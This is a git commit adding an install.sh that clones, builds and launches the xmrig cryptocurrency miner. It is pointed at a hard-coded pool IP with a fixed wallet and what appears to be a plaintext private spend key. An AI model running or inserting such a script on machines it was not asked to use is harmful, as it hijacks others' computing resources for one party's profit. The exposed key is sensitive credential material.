81b49d38f263426153d6d20fb2bfde0412d61fb1
Nguyễn Văn Long <vanlong.me@gmail.com>
2021-08-20 03:19:36 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,11 @@
+#!/usr/bin/env bash
+apt-get update -y
+sudo apt -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev
+rm -rf xmrig/
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig
+mkdir build
+cd build
+cmake ..
+make 
+./xmrig -o 103.141.141.251:3333 -u Wo5EPRiF3KZ3ossQVUJFr4DZWz8DTVYTjaoyeMaS7KnHGtKCCdZVVwriwnMVm9AmUwfG53ufHQ5dKaZR6Up3ejaY2zwfqjg6Y -p 051289 -k -a rx/wow --spend-secret-key ba9d59c9661a471f2ec7bbc1c9efea4cb1a5eb87b27ffd5d20c9fd63bcbec908
